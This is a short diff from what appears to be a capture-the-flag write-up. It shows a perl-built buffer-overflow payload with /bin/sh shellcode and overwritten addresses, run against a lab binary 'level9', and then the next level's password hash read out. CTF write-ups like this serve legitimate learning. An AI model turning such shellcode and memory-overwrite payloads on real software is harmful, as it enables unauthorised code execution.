@@ -43,4 +43,4 @@ We will fill our first buffer until we reach the second instance, and change som
 
 > ./level9 `perl -e 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "A" x 87 . "\x7c\xa0\x04\x08" . "\x0c\xa0\x04\x08"'`
 > $ cat /home/user/bonus0/.pass
-  f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
